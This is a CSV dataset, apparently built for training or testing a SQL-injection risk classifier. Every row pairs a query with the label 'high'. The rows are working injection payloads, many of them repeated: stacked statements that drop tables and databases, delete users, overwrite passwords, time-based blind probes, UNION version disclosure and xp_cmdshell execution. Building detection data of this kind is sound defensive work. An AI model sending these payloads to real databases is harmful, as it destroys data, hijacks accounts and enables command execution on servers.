query,risk
'; WAITFOR DELAY '0:0:5' --,high
'; DROP TABLE temp,high
' OR 1=1; DROP TABLE users --,high
"'; EXEC sp_configure 'options', 1 --",high
'; DROP TABLE temp --,high
'; DROP PROCEDURE admin_login --,high
'; SELECT PG_SLEEP(5) --,high
'; ALTER TABLE users ADD col --,high
'; UPDATE users SET pass='hack' --,high
'; UPDATE users SET pass='hack' --,high
'; INSERT INTO logs VALUES('hack') --,high
'; DROP DATABASE temp --,high
'; ALTER TABLE users ADD col --,high
'; INSERT INTO logs VALUES('hack') --,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
'; SELECT SLEEP(5) --,high
'; DROP PROCEDURE admin_login --,high
'; WAITFOR DELAY '0:0:5' --,high
'; SELECT SLEEP(5) --,high
' OR @@version,high
'; SELECT SLEEP(5) --,high
'; ALTER TABLE users ADD col --,high
'; WAITFOR DELAY '0:0:5' --,high
'; ALTER TABLE users ADD col --,high
'; WAITFOR DELAY '0:0:5' --,high
'; DELETE FROM users --,high
' OR @@version,high
'; INSERT INTO logs VALUES('hack') --,high
'; DROP TABLE temp --,high
'; DROP PROCEDURE admin_login --,high
"'; EXEC sp_configure 'options', 1 --",high
'; DROP PROCEDURE admin_login --,high
'; DROP TABLE temp,high
'; WAITFOR DELAY '0:0:5' --,high
'; INSERT INTO logs VALUES('hack') --,high
'; DELETE FROM users --,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
'; EXEC master..xp_cmdshell 'ping' --,high
'; INSERT INTO logs VALUES('hack') --,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
'; SELECT SLEEP(5) --,high
'; DROP TABLE temp --,high
' OR @@version,high
"'; EXEC sp_configure 'options', 1 --",high
'; SELECT SLEEP(5) --,high
'; DROP TABLE temp,high
"'; EXEC sp_configure 'options', 1 --",high
' OR 1=1; DROP TABLE users --,high
'; UPDATE users SET pass='hack' --,high
'; DROP DATABASE temp --,high
"'; EXEC sp_configure 'options', 1 --",high
' UNION SELECT @@version --,high
'; DROP TABLE temp --,high
'; DROP TABLE temp,high
'; DROP TABLE temp,high
' OR @@version,high
'; DROP TABLE temp --,high
'; DROP DATABASE temp --,high
'; WAITFOR DELAY '0:0:5' --,high
'; WAITFOR DELAY '0:0:5' --,high
' UNION SELECT @@version --,high
' OR @@version,high
'; DROP DATABASE temp --,high
'; DROP TABLE temp,high
' OR 1=1; DROP TABLE users --,high
'; DROP DATABASE temp --,high
' OR @@version,high
'; SELECT SLEEP(5) --,high
' OR @@version,high
'; WAITFOR DELAY '0:0:5' --,high
'; DROP TABLE temp,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
'; SELECT PG_SLEEP(5) --,high
"'; EXEC sp_configure 'options', 1 --",high
'; SELECT SLEEP(5) --,high
'; DROP TABLE temp --,high
'; DROP PROCEDURE admin_login --,high
'; SELECT SLEEP(5) --,high
'; DROP DATABASE temp --,high
'; DROP TABLE temp,high
'; EXEC master..xp_cmdshell 'ping' --,high
'; DELETE FROM users --,high
'; ALTER TABLE users ADD col --,high
'; DELETE FROM users --,high
'; DROP DATABASE temp --,high
'; WAITFOR DELAY '0:0:5' --,high
' UNION SELECT @@version --,high
'; DROP TABLE temp --,high
'; ALTER TABLE users ADD col --,high
'; SELECT SLEEP(5) --,high
' OR @@version,high
' OR @@version,high
'; SELECT PG_SLEEP(5) --,high
'; DROP TABLE temp,high
'; UPDATE users SET pass='hack' --,high
"'; SELECT BENCHMARK(10000,MD5('x')) --",high
